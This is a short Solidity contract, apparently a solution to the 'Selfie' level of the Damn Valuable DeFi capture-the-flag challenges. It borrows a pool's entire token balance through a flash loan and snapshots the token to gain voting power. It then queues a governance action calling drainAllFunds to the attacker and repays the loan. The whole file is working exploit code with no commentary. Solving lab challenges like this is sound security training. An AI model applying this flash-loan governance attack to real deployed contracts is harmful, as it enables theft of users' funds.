pragma solidity ^0.6.0;

import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";

contract SelfieExploit {
    SelfiePool SPool;
    SimpleGovernance SGov;
    DamnValuableTokenSnapshot DVT;
    uint256 actionID;
    address attacker;

    constructor(address _pool, address _gov, address _dvt) public {
        SPool = SelfiePool(_pool);
        DVT = DamnValuableTokenSnapshot(_dvt);
        SGov = SimpleGovernance(_gov);
        attacker = msg.sender;
    }

    function setup() public {
        uint256 poolBalance = DVT.balanceOf(address(SPool));
        SPool.flashLoan(poolBalance);
    }

    function receiveTokens(address token, uint256 amount) public {
        // assume that we already receive token
        DVT.snapshot();
        actionID = SGov.queueAction(
                         address(SPool),
                         abi.encodeWithSignature(
                                                 "drainAllFunds(address)",
                                                 attacker
                                                 ),
                         0
                         );
        DVT.transfer(address(SPool), amount);
    }

    function execute() public {
        SGov.executeAction(actionID);
    }
}

